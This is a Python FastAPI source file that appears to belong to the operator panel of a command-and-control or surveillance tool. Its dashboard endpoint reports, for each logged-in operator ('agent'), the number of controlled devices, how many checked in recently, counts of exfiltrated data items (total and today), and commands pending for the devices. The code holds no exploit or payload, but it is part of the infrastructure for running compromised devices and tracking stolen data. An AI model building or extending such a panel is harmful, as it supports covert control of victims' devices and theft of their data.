from fastapi import APIRouter, Depends
from sqlalchemy.orm import Session
from sqlalchemy import desc, func
from datetime import datetime, timedelta

from ...database import get_db, Device, ExfilData, Command
from ...agent_auth import get_current_agent, Agent
from ...config_constants import cfg_int

router = APIRouter(prefix="/api/agent/dashboard", tags=["agent-dashboard"], redirect_slashes=False)


@router.get("/stats")
async def agent_dashboard_stats(db: Session = Depends(get_db), current_agent: Agent = Depends(get_current_agent)):
    today = datetime.now().date()
    today_start = datetime.combine(today, datetime.min.time())
    total_devices = db.query(func.count(Device.id)).filter(Device.agent_id == current_agent.id).scalar() or 0
    active_minutes = max(1, int(cfg_int(db, "device.active_device_minutes")))
    active_cutoff = datetime.now() - timedelta(minutes=active_minutes)
    active_devices = db.query(func.count(Device.id)).filter(Device.agent_id == current_agent.id, Device.last_seen >= active_cutoff).scalar() or 0
    total_exfil = db.query(func.count(ExfilData.id)).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id).scalar() or 0
    pending = db.query(func.count(Command.id)).join(Device, Command.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id, Command.status == "pending").scalar() or 0
    today_exfil = db.query(func.count(ExfilData.id)).join(Device, ExfilData.device_uuid == Device.device_uuid).filter(Device.agent_id == current_agent.id, ExfilData.uploaded_at >= today_start).scalar() or 0
    return {
        "total_devices": int(total_devices), "active_devices": int(active_devices),
        "total_exfil": int(total_exfil), "pending_commands": int(pending),
        "today_exfil": int(today_exfil),
    }
